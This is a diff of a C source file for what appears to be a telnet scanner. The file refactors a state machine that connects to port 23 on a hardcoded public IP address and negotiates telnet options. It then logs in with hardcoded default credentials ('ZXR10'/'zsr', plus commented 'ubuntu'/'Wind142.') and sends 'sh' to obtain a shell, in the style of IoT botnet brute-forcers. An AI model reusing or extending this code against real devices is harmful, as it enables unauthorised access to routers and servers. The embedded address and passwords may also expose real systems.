@@ -12,89 +12,103 @@
 #include "scanner.h"
 #include "customize.h"
 
-#define ROUTER_ADDR "117.36.153.180"
-#define SERVER_ADDR "192.168.1.142"
 
-int cfd, try_times;
-struct sockaddr_in serv_addr;
-status conn_status = SOCKET_CLOSED;
-uint8_t databuf[512];
-int start_time;
-int time_flag;
-int data_len;
-
-static void establish_connection();
-static void close_connection();
-static int negotiate(uint8_t *buf, int length);
-static BOOL can_get_data(uint8_t *source, int data_len, int8_t *current_pos, int amount);
-static int can_send_username(uint8_t *data, int data_len);
-static int can_send_password(uint8_t *data, int data_len);
+static void establish_connection(struct target *conn);
+static void close_connection(struct target *conn);
+static int negotiate(struct target *conn);
+static int can_send_username(struct target *conn);
+static int can_send_password(struct target *conn);
+static int is_pass_valid(struct target *conn);
+static int is_exec_sh_success(struct target *conn);
 static int str_find(uint8_t* source, int data_len, char* target);
-static int is_pass_valid(uint8_t *data, int data_len);
-static int is_exec_sh_success(uint8_t *data, int data_len);
+static BOOL can_get_data(uint8_t *source, int data_len, int8_t *current_pos, int amount);
 
-/*int main(void)
-  {
-  char* source = "hello,world";
-  char* target = "hello";
-  int ret;
-  int len = strlen(source);
+/*
+   int main(void)
+   {
+   char* source = "hello,world";
+   char* target = "hello";
+   int ret;
+   int len = strlen(source);
 
-  ret = str_find(source, len, target);
-  if (ret > 0)
-  {
-  printf("Find %d\n", ret);	
-  }
-  else
-  {
-  printf("Not find %d\n", ret);
-  }
-  }*/
+   ret = str_find(source, len, target);
+   if (ret > 0)
+   {
+   printf("Find %d\n", ret);	
+   }
+   else
+   {
+   printf("Not find %d\n", ret);
+   }
+   }
+*/
 
 int main(void)
 {
-	int data_len;
-	int nfds;
+	struct target conn;
+	struct auth_entry auth_set;
+	int time_flag;
+
+	//char *user = "ubuntu";
+	char *user = "ZXR10";
+	//char *pass = "Wind142.";
+	char *pass = "zsr";
+	auth_set.username = user;
+	auth_set.password = pass;
+	//auth_set.name_len = 6;
+	auth_set.name_len = 5;
+	//auth_set.pass_len = 8;
+	auth_set.pass_len = 3;
+
+	//conn.ipaddr = INET_ADDR(192,168,1,142);
+	conn.ipaddr = INET_ADDR(117,36,153,180);
+	conn.port = htons(23);
+	conn.auth = &auth_set;
+	conn.function = NULL;
+	conn.try_times = 0;
+
 	fd_set fdread, fdwrite;
 	int maxfd;
 	struct timeval timeout;
 	timeout.tv_sec = 1;
 	timeout.tv_usec = 0;
 
-	establish_connection();
-	maxfd = cfd;
+	establish_connection(&conn);
+	maxfd = conn.cfd;
 
 	while(1)
 	{
-		int ret;
+		int ret = 0;
+		int nfds = 0;
 		FD_ZERO(&fdread);
 		FD_ZERO(&fdwrite);
 
 		int max_timeout;
-		max_timeout = (conn_status > SOCKET_CONNECTING ? 30 : 5);
+		max_timeout = (conn.state > SOCKET_CONNECTING ? 10 : 5);
 
 		//load fd into fd_set
-		if (conn_status >= SOCKET_CONNECTING && time_flag - start_time > max_timeout)
+		if (conn.state >= SOCKET_CONNECTING && time_flag - conn.last_start_time > max_timeout)
 		{
-			if (conn_status > TELNET_HANDLE_IAC && try_times++ < 10)		
+			if (conn.state > TELNET_HANDLE_IAC && conn.try_times < 10)		
 			{
-				establish_connection();	
+				printf("exec here\n");
+				establish_connection(&conn);	
 			}
 			else
 			{
-				close_connection();	
+				close_connection(&conn);	
 				break;
 			}
 		}
 
-		if (conn_status == SOCKET_CONNECTING)
+		if (conn.state == SOCKET_CONNECTING)
 		{
-			FD_SET(cfd, &fdwrite);
+			FD_SET(conn.cfd, &fdwrite);
 		}
 
-		if (conn_status != SOCKET_CLOSED)
+		if (conn.state != SOCKET_CLOSED)
 		{
-			FD_SET(cfd, &fdread);
+			FD_SET(conn.cfd, &fdread);
 		}
 
 		nfds = select(maxfd+1, &fdread, &fdwrite, NULL, &timeout);
@@ -105,165 +119,80 @@ int main(void)
 		}
 		time_flag = time(NULL);
 
-		if (FD_ISSET(cfd, &fdwrite))
+		if (FD_ISSET(conn.cfd, &fdwrite))
 		{
 			int err = 0;
 			socklen_t err_len = sizeof(err);
-			ret = getsockopt(cfd, SOL_SOCKET, SO_ERROR, &err, &err_len);
+			ret = getsockopt(conn.cfd, SOL_SOCKET, SO_ERROR, &err, &err_len);
 			if (err == 0 &&	ret == 0)
 			{
-				conn_status = TELNET_HANDLE_IAC;
+				conn.state = TELNET_HANDLE_IAC;
+				conn.function = &negotiate;
 				/*next combination*/
 			}
 			else
 			{
-				close_connection();
+				close_connection(&conn);
 				continue;
 			}
 		}
 
-		if (FD_ISSET(cfd, &fdread))
+		if (FD_ISSET(conn.cfd, &fdread))
 		{
 			int ret;
-			ret = recv(cfd, databuf, sizeof(databuf), MSG_NOSIGNAL);
+			ret = recv(conn.cfd, conn.data_buf, sizeof(conn.data_buf), MSG_NOSIGNAL);
 			if (ret == 0 || ret == -1)
 			{
 				perror("select:");
 				break;
 			}
-
-			data_len = ret;
-			assert(data_len);
-
-			start_time = time(NULL);
-
-			if (databuf[0] == IAC && conn_status == TELNET_SEND_USERNAME)
+			assert(ret);
+			conn.data_len = ret;
+			conn.last_start_time = time(NULL);
+			if (conn.state > TELNET_SEND_PASSWORD)
 			{
-				conn_status = TELNET_HANDLE_IAC;	
+				printf("qqqqqqqqqqqqqqqqqqqqqqqq\n");
+				printf("%s\n", conn.data_buf);	
+				printf("bbbbbbbbbbbbbbbbbbbbbbbb\n");
+			}
+
+			if (conn.data_buf[0] == IAC && conn.state == TELNET_SEND_USERNAME)
+			{
+				conn.state = TELNET_HANDLE_IAC;	
+				conn.function = &negotiate;
 			}
 
 			while(1)
 			{
-				int used = 0;
+				int used = -1;
 				int ret = 0;
 
-				switch (conn_status)
-				{
-					case TELNET_HANDLE_IAC:
-						used = negotiate(databuf, data_len);
-						if (used > 0)
-						{
-							conn_status = TELNET_SEND_USERNAME;	
-						}
-						break;
-					case TELNET_SEND_USERNAME:
-						/*confirm whether the uesrname can be sent*/
-						used = can_send_username(databuf, data_len);
-						if (used > 0)
-						{
-#ifdef ROUTER
-							ret = send(cfd, "ZXR10", 5, MSG_NOSIGNAL);
-#else
-							ret = send(cfd, "ubuntu", 6, MSG_NOSIGNAL);
-#endif
-							ret = send(cfd, "\r\n", 2, MSG_NOSIGNAL);
-							assert(ret);
-							conn_status = TELNET_SEND_PASSWORD;
-							printf("=======================================\n");
-#ifdef ROUTER
-							printf("USERNAME SEND: ZXR10 %d\n", used);
-#else
-							printf("USERNAME SEND: ubuntu %d\n", used);
-#endif
-							printf("%s\n", databuf);
-							printf("=======================================\n\n");
-						}
-						break;
-					case TELNET_SEND_PASSWORD:
-						/*confirm whether the password can be sent*/
-						used = can_send_password(databuf, data_len);
-						if (used > 0)
-						{
-#ifdef ROUTER
-							ret = send(cfd, "zsr", 3, MSG_NOSIGNAL);
-#else
-							//ret = send(cfd, "Wind142.", 8, MSG_NOSIGNAL);
-							ret = send(cfd, "Wind142.", 8, MSG_NOSIGNAL);
-#endif
-							ret = send(cfd, "\r\n", 2, MSG_NOSIGNAL);
-							assert(ret);
-
-							conn_status = TELNET_VERIFY_PASS;	
-							printf("=======================================\n");
-#ifdef ROUTER
-							printf("PASSWORD SEND: zsr %d\n", used);
-#else
-							printf("PASSWORD SEND: Wind142. %d\n", used);
-#endif
-							printf("%s\n", databuf);
-							printf("=======================================\n\n");
-						}
-						break;
-					case TELNET_VERIFY_PASS:
-						/*is the login successfull?*/
-						used = is_pass_valid(databuf, data_len);
-						if (used > 0)
-						{
-							ret = send(cfd, "sh", 2, MSG_NOSIGNAL);
-							assert(ret);
-							ret = send(cfd, "\r\n", 2, MSG_NOSIGNAL);
-							assert(ret);
-
-							conn_status = TELNET_VERIFY_SH;
-
-							printf("=======================================\n");
-							printf("SH CMD SEND: sh %d\n", used);
-
-							printf("%s\n", databuf);
-							printf("=======================================\n\n");
-						}
-						else
-						{
-							try_times++;
-						}
-						break;
-					case TELNET_VERIFY_SH:
-						//printf("Running here: ");
-						//printf("%s len:%d\n", databuf, data_len+1);
-						used = is_exec_sh_success(databuf, data_len);
-						if (used > 0)
-						{
-							conn_status = TELNET_LOGIN_SUCCESS;	
-							printf("=======================================\n");
-							printf("login success!\n");
-
-							printf("%s\n", databuf);
-							printf("=======================================\n\n");
-						}
-						//printf("handle len: %d\n", used);
-						break;
-					default:
-						used = -1;
-						break;
-				}
-
-				if (conn_status == TELNET_LOGIN_SUCCESS)
+				if (conn.function == NULL)
 				{
 					break;
 				}
 
-				if (used == -1)
+				used = (*(conn.function))(&conn);
+
+				if (conn.state == TELNET_LOGIN_SUCCESS)
 				{
+					printf("Login success!\n");
+					break;
+				}
+
+				if (used < 0)
+				{
+					memset(conn.data_buf, '\0', sizeof(conn.data_buf));
 					break;
 				}
 				else
 				{
 					/*move unprocessed data to the front*/	
-					data_len = data_len - used;
-					if (data_len >= 0)
+					conn.data_len = conn.data_len - used;
+					if (conn.data_len > 0)
 					{
-						bzero(databuf, used);
-						memmove(databuf, databuf+used, data_len);
+						memset(conn.data_buf, '\0', used);
+						memmove(conn.data_buf, conn.data_buf+used, conn.data_len);
 					}
 					else
 					{
@@ -273,7 +202,7 @@ int main(void)
 			}
 		}
 
-		if (conn_status == TELNET_LOGIN_SUCCESS)
+		if (conn.state == TELNET_LOGIN_SUCCESS)
 		{
 			break;	
 		}
@@ -308,9 +237,10 @@ static int str_find(uint8_t* source, int data_len, char* target)
 	return -1;
 }
 
-static int is_exec_sh_success(uint8_t *data, int data_len)
+static int is_exec_sh_success(struct target *conn)
 {
-	char* data_ptr = (char*)data;
+	char* data_ptr = (char*)conn->data_buf;
+	int data_len = conn->data_len;
 	int handle_len = -1;
 	int i;
 
@@ -329,13 +259,23 @@ static int is_exec_sh_success(uint8_t *data, int data_len)
 			break;
 		}
 	}
+	if (handle_len > 0)
+	{
+		conn->state++;	
+		conn->function = NULL;
+		printf("=====================================\n");
+		printf("SH EXEC SUCCESSED\n");
+		printf("%s\n", conn->data_buf);
+		printf("=====================================\n\n");
+	}
 
 	return handle_len;
 }
 
-static int is_pass_valid(uint8_t *data, int data_len)
+static int is_pass_valid(struct target *conn)
 {
-	char* data_ptr = (char*)data;
+	char* data_ptr = (char*)conn->data_buf;
+	int data_len = conn->data_len;
 	int handle_len = -1;
 	int i;
 	int ret;
@@ -349,41 +289,45 @@ static int is_pass_valid(uint8_t *data, int data_len)
 		}
 	}
 
+
+	if (handle_len > 0)
+	{
+		ret = send(conn->cfd, "sh", 2, MSG_NOSIGNAL);
+		assert(ret);
+		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
+		assert(ret);
+
+		conn->state++;
+		conn->function = &is_exec_sh_success;
+
+		
+		printf("=====================================\n");
+		printf("try times:%d\n", conn->try_times);
+		printf("SH CMD SEND\n");
+		printf("%s\n", conn->data_buf);
+		printf("=====================================\n\n");
+	}
+	/*else if (handle_len == -1)
+	{
+		printf("*************************************\n");
+		printf("%s\n", conn->data_buf);
+		printf("*************************************\n\n");
+	}*/
+	/*else if (handle_len == -1)
+	{
+		if (conn->try_times < 10)
+		{
+			close_connection(conn);
+			establish_connection(conn);	
+		}
+	}*/
 	return handle_len;
 }
 
-static int can_send_username(uint8_t *data, int data_len)
+static int can_send_password(struct target *conn)
 {
-	char *data_ptr = (char*)data;	
-	int handle_len = -1;
-	int i;
-	int ret;
-
-	for (i = data_len; i >= 0; i--)
-	{
-		if (data_ptr[i] == ':' || data_ptr[i] == '>' || data_ptr[i] == '%' || data_ptr[i] == '#' || data_ptr[i] == '$')
-		{
-			handle_len = i + 1;
-			break;
-		}
-	}
-
-	if (handle_len == -1)
-	{
-		ret = str_find(data, data_len, "login");	
-		if (ret == -1)
-		{
-			ret = str_find(data, data_len, "enter");
-		}
-		handle_len = ret;
-	}
-
-	return handle_len;
-}
-
-static int can_send_password(uint8_t *data, int data_len)
-{
-	char *data_ptr = (char*)data;
+	char *data_ptr = (char*)conn->data_buf;
+	int data_len = conn->data_len;
 	int handle_len = -1;
 	int ret;
 	int i;
@@ -399,8 +343,129 @@ static int can_send_password(uint8_t *data, int data_len)
 
 	if (handle_len == -1)
 	{
-		ret = str_find(data, data_len, "ssword");	
+		ret = str_find(data_ptr, data_len, "ssword");	
 		handle_len = ret;
+	}
+
+	if (handle_len > 0)
+	{
+		ret = send(conn->cfd, conn->auth->password, conn->auth->pass_len, MSG_NOSIGNAL);
+		assert(ret);
+		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
+		assert(ret);
+
+		conn->state++;
+		conn->function = &is_pass_valid;
+		
+		printf("=====================================\n");
+		printf("PASSWORD SEND\n");
+		printf("%s\n", conn->data_buf);
+		printf("=====================================\n\n");
+	}
+
+	return handle_len;
+}
+
+static int can_send_username(struct target *conn)
+{
+	char *data_ptr = (char*)conn->data_buf;
+	int data_len = conn->data_len;
+	int handle_len = -1;
+	int i;
+	int ret;
+
+	for (i = data_len; i >= 0; i--)
+	{
+		if (data_ptr[i] == ':' || data_ptr[i] == '>' || data_ptr[i] == '%' || data_ptr[i] == '#' || data_ptr[i] == '$')
+		{
+			handle_len = i + 1;
+			break;
+		}
+	}
+
+	if (handle_len == -1)
+	{
+		ret = str_find(data_ptr, data_len, "login");	
+		if (ret == -1)
+		{
+			ret = str_find(data_ptr, data_len, "enter");
+		}
+		handle_len = ret;
+	}
+
+	if (handle_len > 0)
+	{
+		ret = send(conn->cfd, conn->auth->username, conn->auth->name_len, MSG_NOSIGNAL);	
+		assert(ret);
+		ret = send(conn->cfd, "\r\n", 2, MSG_NOSIGNAL);
+		assert(ret);
+
+		conn->state++;
+		conn->function = &can_send_password;
+		printf("=====================================\n");
+		printf("USERNAME SEND\n");
+		printf("%s\n", conn->data_buf);
+		printf("=====================================\n\n");
+	}
+
+	return handle_len;
+}
+
+//sub-option negotiation
+static int negotiate(struct target *conn)
+{
+	uint8_t *data_ptr = conn->data_buf;
+	int data_len = conn->data_len;
+	int ret;
+	int handle_len = 0;
+
+	while (handle_len < data_len)
+	{
+		if (data_ptr[0] != IAC)
+		{
+			break;	
+		}
+
+		/*to check whether it can conitune*/
+		if (!can_get_data(conn->data_buf, data_len, data_ptr, 2))
+		{
+			break;	
+		}
+
+		/*we must reply our window size to server.*/
+		if (data_ptr[1] == DONT || data_ptr[1] == WONT)
+		{
+			data_ptr += 3;	
+		}
+		else if ((data_ptr[1] == DO) && (data_ptr[2] == WIN_SIZE))
+		{
+			uint8_t iac_win_size[3] = {IAC, WILL, WIN_SIZE};	
+			uint8_t tell_win_size[9] = {IAC, SOBEGIN, WIN_SIZE, 0, 80, 0, 0, IAC, SOEND};
+
+			ret = send(conn->cfd, iac_win_size, 3, MSG_NOSIGNAL);
+			assert(ret);
+			ret = send(conn->cfd, tell_win_size, 9, MSG_NOSIGNAL);
+			assert(ret);
+
+			data_ptr += 3;
+			handle_len += 3;
+		}
+		else
+		{
+			data_ptr[1] = data_ptr[1] == DO ? WONT : DO;
+
+			ret = send(conn->cfd, data_ptr, 3, MSG_NOSIGNAL);
+			assert(ret);
+
+			data_ptr += 3;
+			handle_len += 3;
+		}
+	}
+
+	if (handle_len > 0)
+	{
+		conn->state++;
+		conn->function = &can_send_username;	
 	}
 
 	return handle_len;
@@ -421,91 +486,33 @@ static BOOL can_get_data(uint8_t *source, int data_len, int8_t *current_pos, int
 	}
 }
 
-static void establish_connection()
+static void establish_connection(struct target *conn)
 {
 	int ret;
+	struct sockaddr_in serv_addr;
+
 	serv_addr.sin_family = AF_INET;
-#ifdef ROUTER
-	inet_aton(ROUTER_ADDR, (void*)&serv_addr.sin_addr);
-#else
-	inet_aton(SERVER_ADDR, (void*)&serv_addr.sin_addr);
-#endif
-	serv_addr.sin_port = htons(23);
+	serv_addr.sin_addr.s_addr = conn->ipaddr;
+	serv_addr.sin_port = conn->port;
 
-	cfd = socket(AF_INET, SOCK_STREAM, 0);
-	assert(cfd);
-	ret = connect(cfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+	conn->cfd = socket(AF_INET, SOCK_STREAM, 0);
+	assert(conn->cfd);
+
+	ret = connect(conn->cfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
 	assert(!ret);
-	conn_status = SOCKET_CONNECTING;
-	start_time = time(NULL);
+
+	conn->state = SOCKET_CONNECTING;
+	conn->last_start_time = time(NULL);
+	conn->function = NULL;
 }
 
-static void close_connection()
+static void close_connection(struct target *conn)
 {
-	if (cfd != -1)
+	if (conn->cfd != -1)
 	{
-		close(cfd);	
-		cfd = -1;
-		conn_status = SOCKET_CLOSED;
+		close(conn->cfd);	
+		conn->cfd = -1;
+		conn->state = SOCKET_CLOSED;
+		conn->function = NULL;
 	}
-}
-
-//sub-option negotiation
-static int negotiate(uint8_t *data, int data_len)
-{
-	uint8_t *data_ptr = data;
-	int ret;
-	int handle_len = 0;
-
-	while (handle_len < data_len)
-	{
-		if (data_ptr[0] != IAC)
-		{
-			break;	
-		}
-
-		/*to check whether it can conitune*/
-		if (!can_get_data(databuf, data_len, data_ptr, 2))
-		{
-			break;	
-		}
-
-		/*we must reply our window size to server.*/
-		if (data_ptr[1] == DONT || data_ptr[1] == WONT)
-		{
-			data_ptr += 3;	
-		}
-		else if ((data_ptr[1] == DO) && (data_ptr[2] == WIN_SIZE))
-		{
-			uint8_t iac_win_size[3] = {IAC, WILL, WIN_SIZE};	
-			uint8_t tell_win_size[9] = {IAC, SOBEGIN, WIN_SIZE, 0, 80, 0, 0, IAC, SOEND};
-
-			ret = send(cfd, iac_win_size, 3, MSG_NOSIGNAL);
-			assert(ret);
-			ret = send(cfd, tell_win_size, 9, MSG_NOSIGNAL);
-			assert(ret);
-
-			data_ptr += 3;
-			handle_len += 3;
-		}
-		else
-		{
-			/*if (data_ptr[1] == DO)
-			  {
-			  data_ptr[1] = WONT;	
-			  }
-			  else if (data_ptr[1] == WILL)
-			  {
-			  data_ptr[1] = DO;	
-			  }*/
-			data_ptr[1] = data_ptr[1] == DO ? WONT : DO;
-
-			ret = send(cfd, data_ptr, 3, MSG_NOSIGNAL);
-			assert(ret);
-
-			data_ptr += 3;
-			handle_len += 3;
-		}
-	}
-	return handle_len;
 }
